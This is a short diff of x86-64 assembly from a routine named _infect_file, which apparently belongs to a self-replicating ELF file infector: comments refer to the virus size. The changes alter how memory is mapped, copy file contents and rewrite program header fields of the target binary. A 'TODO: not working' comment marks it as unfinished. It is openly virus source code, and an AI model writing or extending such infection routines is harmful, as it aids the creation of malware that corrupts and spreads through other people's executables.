@@ -821,10 +821,10 @@ _infect_file: ; (string rdi, stat rsi)
 			add rsi, r14; add virus size
 			push 3
 			pop rdx ; PROT_READ | PROT_WRITE
-			push MAP_PRIVATE
-			pop r10 ; MAP_PRIVATE
+			push 34
+			pop r10 ; MAP_PRIVATE | MAP_ANON
 			xor r9, r9
-			mov r8, r11; fd
+			xor r8, r8
 			push r11
 			push SYSCALL_MMAP
 			pop rax ; mmap
@@ -832,6 +832,11 @@ _infect_file: ; (string rdi, stat rsi)
 			pop r11
 			pop r10
 			pop r8
+
+			mov rdi, rax
+			mov rsi, r13
+			mov rdx, [r12 + ST_SIZE]
+			call _ft_memcpy
 			pop rsi
 
 			sub rbx, r13
@@ -856,13 +861,13 @@ _infect_file: ; (string rdi, stat rsi)
 
 			mov [rbx + P_VADDR], rax
 			mov [rbx + P_PADDR], rax
-;			mov [rbx + P_FILESZ], r14
-;			mov [rbx + P_MEMSZ], r14
+			mov qword[rbx + P_FILESZ], 0x0
+			mov qword[rbx + P_MEMSZ], 0x0
 			mov qword[rbx + P_ALIGN], 0x1000
 
 			push r11
 
-			mov rdi, [rbx + P_OFFSET]
+			mov rdi, [r12 + ST_SIZE]
 			; TODO: not working
 			add rdi, r13 ; addr pointer -> mmap
 
